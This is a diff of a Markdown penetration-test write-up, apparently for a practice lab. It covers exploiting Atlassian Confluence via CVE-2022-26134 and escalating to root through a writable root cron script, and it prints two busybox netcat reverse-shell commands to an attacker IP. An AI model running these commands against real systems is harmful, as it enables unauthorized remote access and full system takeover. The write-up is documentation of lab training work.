@@ -114,8 +114,10 @@ Nmap done: 1 IP address (1 host up) scanned in 123.47 seconds
 
 Enumeration of port 8090 using a browser:
 Accessing the service through a browser revealed a login page: http://192.168.172.41:8090/login.action?os_destination=%2Findex.action&permissionViolation=true
-![[Pasted image 20260121103641.png]]
-The page was identified as **Atlassian Confluence**, version **7.13.6**, as indicated by the footer:
+
+<img width="1209" height="680" alt="Pasted image 20260121103641" src="https://github.com/user-attachments/assets/4dd2b76c-1a35-4295-a8d2-98c5f01430bd" />
+
+The page was identified as Atlassian Confluence, version 7.13.6, as indicated by the footer:
 ```
 Powered by Atlassian Confluence 7.13.6
 ```
@@ -129,12 +131,13 @@ No additional interesting endpoints or hidden directories were identified during
 
 The following exploit was initially tested but did not work in this environment: https://www.exploit-db.com/exploits/51904
 
-![[Pasted image 20260121105155.png]]
-![[Pasted image 20260121105141.png]]
+<img width="1204" height="356" alt="Pasted image 20260121105155" src="https://github.com/user-attachments/assets/646651e1-4274-4b5a-aed1-f746b70d0d35" />
+
+<img width="660" height="299" alt="Pasted image 20260121105141" src="https://github.com/user-attachments/assets/a4c2e532-7aa2-4e61-8b98-96706d9866f3" />
 
 Further research led to another exploit targeting CVE-2022-26134, a known unauthenticated Remote Code Execution vulnerability in Atlassian Confluence: https://www.exploit-db.com/exploits/50952
 
-![[Pasted image 20260121105230.png]]
+<img width="1204" height="356" alt="Pasted image 20260121105230" src="https://github.com/user-attachments/assets/08b4d7b9-c250-46d0-863c-3208f7eca91a" />
 
 ## Initial Access
 
@@ -150,9 +153,12 @@ Command:
 python3 50952.py -u $url:8090 -c "busybox nc 192.168.45.234 80 -e /bin/bash"
 ```
 
-![[Pasted image 20260121105406.png]]
-![[Pasted image 20260121105557.png]]
-![[Pasted image 20260121105722.png]]
+<img width="500" height="137" alt="Pasted image 20260121105406" src="https://github.com/user-attachments/assets/1c1206cf-117c-42c9-bfd0-09bf6287cbc4" />
+
+<img width="685" height="263" alt="Pasted image 20260121105557" src="https://github.com/user-attachments/assets/c1477a7e-2d73-4e82-9bf3-5a35a566cb83" />
+
+<img width="516" height="120" alt="Pasted image 20260121105722" src="https://github.com/user-attachments/assets/f4f75b37-2906-4ae4-996c-aa8695fa12a7" />
+
 The target was confirmed to be vulnerable to CVE-2022-26134.
 This resulted in a successful reverse shell connection to the attacker machine, granting command execution on the target system as the confluence user.
 
@@ -160,22 +166,23 @@ This resulted in a successful reverse shell connection to the attacker machine, 
 
 ### Vulnerability Exploited: Misconfigured Cron Job
 
-Vulnerability Explanation: A scheduled cron job executed by the **root** user was found to run the script `/opt/log-backup.sh`.  
+Vulnerability Explanation: A scheduled cron job executed by the root user was found to run the script /opt/log-backup.sh.  
 Although the script was executed with root privileges, it was owned and writable by the unprivileged confluence user. 
 
-### Enumeration
+### Enumeration:
 
 After obtaining a shell as the `confluence` user, local enumeration was performed to identify potential privilege escalation vectors.
 
 The tool pspy was used to monitor running processes without requiring root privileges.  
-Using `pspy`, a recurring cron job executed by the **root** user was observed:
+Using `pspy`, a recurring cron job executed by the root user was observed:
 
 - The script `/opt/log-backup.sh` was periodically executed by `/bin/bash`
     
 - The process was running by root
 
 This confirmed the presence of a root-owned cron job executing a script located in /opt.
-![[Pasted image 20260121120804.png]]
+
+<img width="1087" height="186" alt="Pasted image 20260121120804" src="https://github.com/user-attachments/assets/0a9e63a9-2180-472d-b5b5-580bd531d807" />
 
 The file permissions of the script were checked:
 
@@ -183,19 +190,20 @@ The file permissions of the script were checked:
 ls -l /opt/log-backup.sh
 ```
 
-![[Pasted image 20260121121327.png]]
-The output showed that the script was **owned by the `confluence` user** and was **writable**:
+<img width="756" height="130" alt="Pasted image 20260121121327" src="https://github.com/user-attachments/assets/b58bcfec-6aa9-4c0a-a09b-8a73b38ba16a" />
+
+The output showed that the script was owned by the `confluence user and was writable:
 
 `-rwxr-xr-x 1 confluence confluence log-backup.sh`
 
-The script contained backup-related commands that accessed the directory `/root/backup`, confirming that it was executed with root privileges.
-Because the script was executed by **root** (via cron), but modifiable by the confluence user,
+The script contained backup-related commands that accessed the directory /root/backup, confirming that it was executed with root privileges.
+Because the script was executed by root (via cron), but modifiable by the confluence user,
 
-it was possible to abuse this misconfiguration to achieve privilege escalation.
+It was possible to abuse this misconfiguration to achieve privilege escalation.
 
-![[Pasted image 20260121112325.png]]
+<img width="661" height="347" alt="Pasted image 20260121112325" src="https://github.com/user-attachments/assets/8f4a7a94-31c5-4109-b71e-d83db1a253a5" />
 
-## Exploitation:
+### Exploitation:
 
 The script `/opt/log-backup.sh` was overwritten with a reverse shell payload:
 
@@ -203,7 +211,9 @@ The script `/opt/log-backup.sh` was overwritten with a reverse shell payload:
 echo 'bash -c "busybox nc 192.168.45.234 4444 -e /bin/bash"' > log-backup.sh
 ```
 After waiting for the cron job to execute, a reverse shell connection was received on the attacker machine.
-![[Pasted image 20260121121538.png]]
+
+<img width="519" height="126" alt="Pasted image 20260121121538" src="https://github.com/user-attachments/assets/d09f646b-9af7-4305-a946-bdaf1c89c087" />
+
 The obtained shell was running as the root user, successfully completing the privilege escalation.
 
 
